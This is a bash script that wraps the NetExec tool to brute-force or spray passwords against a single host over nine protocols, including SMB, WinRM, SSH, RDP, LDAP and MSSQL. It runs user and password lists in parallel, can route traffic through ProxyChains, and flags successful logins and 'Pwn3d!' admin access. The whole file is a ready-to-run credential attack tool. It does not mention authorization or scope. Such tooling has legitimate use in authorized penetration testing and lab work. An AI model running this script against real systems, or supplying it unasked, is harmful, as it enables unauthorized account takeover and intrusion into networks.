#!/usr/bin/env bash
#
# NetExec multi-protocol authentication tester
#
# Usage:
#   ./nxc_brute.sh <TARGET> <USERS_FILE> <PASSWORD|PASSWORD_FILE> [OPTIONS]
#
# Examples:
#   ./nxc_brute.sh 10.10.10.5 users.txt 'Winter2025!'
#   ./nxc_brute.sh 10.10.10.5 users.txt passwords.txt --threads 50
#   ./nxc_brute.sh 10.10.10.5 users.txt passwords.txt --protocols smb,winrm,wmi
#   ./nxc_brute.sh 10.10.10.5 users.txt 'Winter2025!' --proxychains --local-auth

set -uo pipefail

# Python block-buffers stdout when piped; without this, hits appear only at exit.
export PYTHONUNBUFFERED=1

# ---------------------------------------------------------------- defaults ---
THREADS=25           # nxc workers inside one protocol
JOBS=4               # protocols tested in parallel
CONN_TIMEOUT=8       # per-connection timeout handed to nxc
MAX_TIME=300         # hard wall-clock cap per protocol, seconds
PORT_TIMEOUT=3       # pre-flight TCP reachability probe
PORT_CHECK=true
LOCAL_AUTH=false
PROXY_CMD=()
PROTOCOLS=(smb winrm ssh rdp ldap mssql ftp wmi nfs)

THREADS_SET=false
JOBS_SET=false

# Ports a protocol needs. If none of them answer, the protocol is skipped
# instead of being left to stall until the time limit.
declare -A PROTO_PORTS=(
    [smb]="445 139"
    [winrm]="5985 5986"
    [ssh]="22"
    [rdp]="3389"
    [ldap]="389 636"
    [mssql]="1433"
    [ftp]="21"
    [wmi]="135"
    [nfs]="2049 111"
)

usage() {
    cat <<EOF
Usage: $0 <TARGET> <USERS_FILE> <PASSWORD|PASSWORD_FILE> [OPTIONS]

Options:
  --proxychains               Use default ProxyChains configuration
  --proxychains-config FILE   Use custom ProxyChains configuration
  --local-auth                Authenticate against local accounts
  --threads N                 nxc worker threads per protocol (default: $THREADS)
  --jobs N                    Protocols tested in parallel (default: $JOBS)
  --timeout SEC               Per-connection timeout for nxc (default: $CONN_TIMEOUT)
  --max-time SEC              Hard limit per protocol before it is killed (default: $MAX_TIME)
  --port-timeout SEC          Pre-flight port probe timeout (default: $PORT_TIMEOUT)
  --no-port-check             Do not pre-probe ports; test every protocol
  --protocols LIST            Comma-separated subset, e.g. smb,winrm,mssql
  -h, --help                  Show this help

Notes:
  * Hits print the moment nxc reports them, per protocol, while other
    protocols are still running.
  * Protocols whose port is closed are skipped up front. This is what keeps
    LDAP from stalling against a host that is not a domain controller.
  * The port probe is a direct TCP connect, so it is disabled automatically
    under ProxyChains, where it would bypass the proxy and lie to you.
EOF
}

die() { echo "[-] $*" >&2; exit 1; }

is_uint() { [[ $1 =~ ^[1-9][0-9]*$ ]]; }

if [[ $# -lt 3 ]]; then
    usage
    exit 1
fi

TARGET="$1"
USERS="$2"
PASSWORD="$3"
shift 3

# ------------------------------------------------------------------ parse ----
while [[ $# -gt 0 ]]; do
    case "$1" in
        --proxychains)
            PROXY_CMD=(proxychains4 -q)
            shift
            ;;
        --proxychains-config)
            [[ $# -ge 2 && -f "$2" ]] || die "Invalid ProxyChains configuration file."
            PROXY_CMD=(proxychains4 -q -f "$2")
            shift 2
            ;;
        --local-auth)
            LOCAL_AUTH=true
            shift
            ;;
        --threads)
            [[ $# -ge 2 ]] && is_uint "$2" || die "--threads needs a positive integer."
            THREADS="$2"; THREADS_SET=true
            shift 2
            ;;
        --jobs)
            [[ $# -ge 2 ]] && is_uint "$2" || die "--jobs needs a positive integer."
            JOBS="$2"; JOBS_SET=true
            shift 2
            ;;
        --timeout)
            [[ $# -ge 2 ]] && is_uint "$2" || die "--timeout needs a positive integer."
            CONN_TIMEOUT="$2"
            shift 2
            ;;
        --max-time)
            [[ $# -ge 2 ]] && is_uint "$2" || die "--max-time needs a positive integer."
            MAX_TIME="$2"
            shift 2
            ;;
        --port-timeout)
            [[ $# -ge 2 ]] && is_uint "$2" || die "--port-timeout needs a positive integer."
            PORT_TIMEOUT="$2"
            shift 2
            ;;
        --no-port-check)
            PORT_CHECK=false
            shift
            ;;
        --protocols)
            [[ $# -ge 2 ]] || die "--protocols needs a comma-separated list."
            IFS=',' read -r -a PROTOCOLS <<< "$2"
            [[ ${#PROTOCOLS[@]} -gt 0 ]] || die "--protocols list is empty."
            shift 2
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            echo "[-] Unknown option: $1"
            usage
            exit 1
            ;;
    esac
done

# ------------------------------------------------------------ requirements ---
[[ -f "$USERS" ]] || die "Username file not found: $USERS"
command -v nxc &>/dev/null || die "NetExec (nxc) is not installed."

if [[ ${#PROXY_CMD[@]} -gt 0 ]]; then
    command -v proxychains4 &>/dev/null || die "ProxyChains is not installed."
    # Chained SOCKS + many threads = timeouts that look like failed logins.
    [[ $THREADS_SET == true ]] || THREADS=1
    [[ $JOBS_SET == true ]] || JOBS=1
    # /dev/tcp would not traverse the proxy, so its verdict would be wrong.
    PORT_CHECK=false
fi

TIMEOUT_CMD=()
if command -v timeout &>/dev/null; then
    TIMEOUT_CMD=(timeout --kill-after=10s "${MAX_TIME}s")
else
    echo "[!] coreutils 'timeout' not found - protocols will run unbounded."
fi

OUTDIR="nxc_results_$(date +%Y%m%d_%H%M%S)"
STATUSDIR="$OUTDIR/.status"
mkdir -p "$STATUSDIR"

cleanup() {
    trap - INT TERM
    echo
    echo "[-] Interrupted - stopping running protocols."
    kill -- -$$ 2>/dev/null
    exit 130
}
trap cleanup INT TERM

# --------------------------------------------------------------- port probe --
port_open() {
    local host="$1" port="$2"
    timeout "$PORT_TIMEOUT" bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null
}

proto_reachable() {
    local proto="$1" port
    [[ $PORT_CHECK == true ]] || return 0
    [[ -n "${PROTO_PORTS[$proto]:-}" ]] || return 0   # unknown protocol: just try it
    for port in ${PROTO_PORTS[$proto]}; do
        port_open "$TARGET" "$port" && return 0
    done
    return 1
}

count_hits() {
    local log="$1" n
    n=$(grep -cE '\[\+\]' "$log" 2>/dev/null) || true
    [[ -n "${n:-}" ]] || n=0
    echo "$n"
}

# -------------------------------------------------------------- one protocol -
run_proto() {
    local proto="$1"
    local log="$OUTDIR/$proto.log"
    local help rc hits

    if ! proto_reachable "$proto"; then
        printf '[-] %-6s port closed (%s) - skipped\n' "$proto" "${PROTO_PORTS[$proto]// /, }"
        echo "skipped" > "$STATUSDIR/$proto"
        return 0
    fi

    # Probe support once, bounded so a wedged probe cannot stall the run.
    if ! help=$(timeout 20s nxc "$proto" -h 2>&1); then
        printf '[-] %-6s not supported by this NetExec build - skipped\n' "$proto"
        echo "skipped" > "$STATUSDIR/$proto"
        return 0
    fi

    local args=("$proto" "$TARGET" -u "$USERS" -p "$PASSWORD")

    grep -q -- '--continue-on-success' <<< "$help" && args+=(--continue-on-success)
    grep -q -- '--threads'             <<< "$help" && args+=(--threads "$THREADS")
    grep -q -- '--timeout'             <<< "$help" && args+=(--timeout "$CONN_TIMEOUT")

    if [[ "$LOCAL_AUTH" == true ]]; then
        if grep -q -- '--local-auth' <<< "$help"; then
            args+=(--local-auth)
        else
            printf '[!] %-6s has no --local-auth - skipped\n' "$proto"
            echo "skipped" > "$STATUSDIR/$proto"
            return 0
        fi
    fi

    printf '[*] %-6s started\n' "$proto"

    if [[ $JOBS -eq 1 ]]; then
        # Serial mode: full live output.
        "${TIMEOUT_CMD[@]+"${TIMEOUT_CMD[@]}"}" \
            "${PROXY_CMD[@]+"${PROXY_CMD[@]}"}" \
            nxc "${args[@]}" 2>&1 | tee "$log"
        rc=${PIPESTATUS[0]}
    else
        # Parallel mode: full output to the log, hits streamed to the console
        # as nxc reports them.
        "${TIMEOUT_CMD[@]+"${TIMEOUT_CMD[@]}"}" \
            "${PROXY_CMD[@]+"${PROXY_CMD[@]}"}" \
            nxc "${args[@]}" 2>&1 \
            | tee "$log" \
            | grep --line-buffered -E '\[\+\]|Pwn3d!' \
            | sed -u "s/^/    >> [$proto] /"
        rc=${PIPESTATUS[0]}
    fi

    hits=$(count_hits "$log")

    case "$rc" in
        124|137)
            printf '[!] %-6s hit the %ss limit and was killed (%s hit(s) before that)\n' \
                   "$proto" "$MAX_TIME" "$hits"
            echo "timeout" > "$STATUSDIR/$proto"
            ;;
        0)
            printf '[+] %-6s finished - %s hit(s)\n' "$proto" "$hits"
            echo "ok" > "$STATUSDIR/$proto"
            ;;
        *)
            printf '[-] %-6s exited %s - %s hit(s), see %s\n' "$proto" "$rc" "$hits" "$log"
            echo "error" > "$STATUSDIR/$proto"
            ;;
    esac
}

# ------------------------------------------------------------------- banner --
echo "==================================="
echo " NetExec Multi-Protocol Auth Tester"
echo "==================================="
echo "[*] Target:      $TARGET"
echo "[*] Users:       $USERS ($(grep -c . "$USERS" 2>/dev/null || echo '?') entries)"
if [[ -f "$PASSWORD" ]]; then
    echo "[*] Passwords:   $PASSWORD ($(grep -c . "$PASSWORD" 2>/dev/null || echo '?') entries, read as a list by nxc)"
else
    echo "[*] Password:    single value"
fi
echo "[*] Protocols:   ${PROTOCOLS[*]}"
echo "[*] Threads:     $THREADS  (per protocol)"
echo "[*] Parallel:    $JOBS protocol(s) at a time"
echo "[*] Conn/limit:  ${CONN_TIMEOUT}s connect, ${MAX_TIME}s max per protocol"
echo "[*] Port check:  $([[ $PORT_CHECK == true ]] && echo "Enabled (${PORT_TIMEOUT}s)" || echo Disabled)"
echo "[*] ProxyChains: $([[ ${#PROXY_CMD[@]} -gt 0 ]] && echo Enabled || echo Disabled)"
echo "[*] Local Auth:  $LOCAL_AUTH"
echo "[*] Output:      $OUTDIR"
echo

START=$(date +%s)

for PROTO in "${PROTOCOLS[@]}"; do
    if [[ $JOBS -eq 1 ]]; then
        run_proto "$PROTO"
    else
        while (( $(jobs -rp | wc -l) >= JOBS )); do sleep 0.3; done
        run_proto "$PROTO" &
    fi
done

# Say what is still outstanding so a slow protocol does not look like a freeze.
if [[ $JOBS -gt 1 ]]; then
    while (( $(jobs -rp | wc -l) > 0 )); do
        sleep 30
        (( $(jobs -rp | wc -l) > 0 )) || break
        PENDING=()
        for PROTO in "${PROTOCOLS[@]}"; do
            [[ -f "$STATUSDIR/$PROTO" ]] || PENDING+=("$PROTO")
        done
        [[ ${#PENDING[@]} -gt 0 ]] &&
            printf '[*] still running after %ss: %s\n' "$(( $(date +%s) - START ))" "${PENDING[*]}"
    done
fi
wait

ELAPSED=$(( $(date +%s) - START ))

# ------------------------------------------------------------------ summary --
echo
echo "==================================="
echo "[+] Possible successful logins"
echo "==================================="
grep -hE '\[\+\]|Pwn3d!' "$OUTDIR"/*.log 2>/dev/null | sort -u || true

TIMED_OUT=$(grep -l '^timeout$' "$STATUSDIR"/* 2>/dev/null | xargs -r -n1 basename | tr '\n' ' ')
if [[ -n "${TIMED_OUT// }" ]]; then
    echo
    echo "[!] Killed on the time limit: $TIMED_OUT"
    echo "    Re-run those alone with a higher --max-time if you need full coverage."
fi

rm -rf "$STATUSDIR"

echo
echo "[+] Done in ${ELAPSED}s. Results saved to: $OUTDIR"
